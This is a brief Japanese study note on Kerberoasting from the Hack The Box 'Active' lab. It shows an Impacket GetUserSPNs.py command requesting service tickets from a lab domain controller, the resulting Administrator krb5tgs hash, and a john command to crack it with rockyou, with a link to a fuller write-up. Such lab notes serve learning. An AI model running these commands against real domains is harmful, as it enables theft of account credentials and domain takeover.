# Kerberoasting攻撃
正直あんまりわかってない

### 暗号化されたチケットの取得

```
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py  active.htb/<username>:<password> -dc-ip 10.10.10.100 -request
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                  
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2018-07-30 13:17:40.656520 



$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$e00e9662feaee44bdbb8bc634d4fb189$fc2ac849a75477a6ea851e999b54fefb2e5e048d9fc695c2830f740e1a942595571e7d153e0b9c5dbbb8004f789c42850784f5599b92c274eacbe9060d53febd805f29aaa754d666d80755fca082d67c3b012c98779b47bd76ac69882456304ec925b6afd5d4a848f6d6473276f6d65127c197ff578e993ea012dca77db8faff3e09d96915e9c3382459bdec17e2ece6dc93ab7b32eb3162ad7dd8b706236d0e92342491abba2b4e6b08b7e37f37ef104018b35d63d992f2b159bbfe97657ea47d32efa2b42bcec15df6b3a344476f82d918c59517c8941103442b079de9cf0cd4705876d1dd3d1500ca69859e03f5779a5219c83a9112d8faa6eff4bfe012f4244fcb733a211da66cc9afc3915cd26712119961a3e414083a9766a25f5db408b5f62dd60bc1a5c19ef3a741b04efe66c893bb9b27c2454902e7f63310eb2b98d5119becf4c979b60ba3c13f4035f2eb4762b02bfa9f492872d924bc9cb87a7ed3fc4caba9794483a8dc46654d2a80f1942cc8e60056ead5e124c595f227671e14dca503f8d7504d62544abad632e0786afc8ce38ab382bbccbb93dee09632d8ccabc40e9a79ed1c16539f10fec1261a92e7d52540f7354b3cfa381f7bcfd2c104b60cfa8bb72b49b0724711f5685c44a91731564ad8127e04d08d23bc64fddabbe0927cb30d23396e07cbc198c8ee2cf78ef89a8a3e0161aadefd2440483081f1fe6de56258965b53f6e1ca8e14d7993e3847f70cb9a4c768ea56714c5b9b55e7ccd1eb51bc79f2948b10f867aaf388c3c8e087072b0e3e7c674f8a4684920dae1e6df2f65a570787687458976db83a01b2f62f581c981b6819eed2f2bcc0ea4272699f1cd7e94b62843927b41b5d272ebd13dcc48adb54c7932e06d619a879dfe9763cf85ebe84bfd63c8a83065f0ce284f59ee5700c23673b799208b4befe63a8b7e94d8d3874074622240d511b3b46ce82ba525f21669605cb2a1f5675aa7a6495bebc64f7a76075016b45943e4440c7259ad58baafacbae929813e7b95355eb360f997e3e822d3b945c563f0b0479d5b5017207693c93571fd7f39a248bab1602dbcabecd376767b0f4289385f8b2b136a084bf7eb60bd8717b0aec9ca53f004e0e14d94e1f3d8bd19caf8648ee0512feda8206d0dd95adb1a5dc92ff4f2099b4da2c7b32f218fbf4790a261c0f8add5d17e0430324406218a6c7c38e5fcf16a6cc3ba3fe2667155cc634655ff05f9683c2f943311f7b99
```

この後ハッシュをjohnとかで解析

```
john --wordlist=/usr/share/wordlists/rockyou.txt active.txt
```


[【Hack the Box write-up】Active](https://qiita.com/sanpo_shiho/items/d06f72721b08be016b81#kerberoasting%E6%94%BB%E6%92%83)
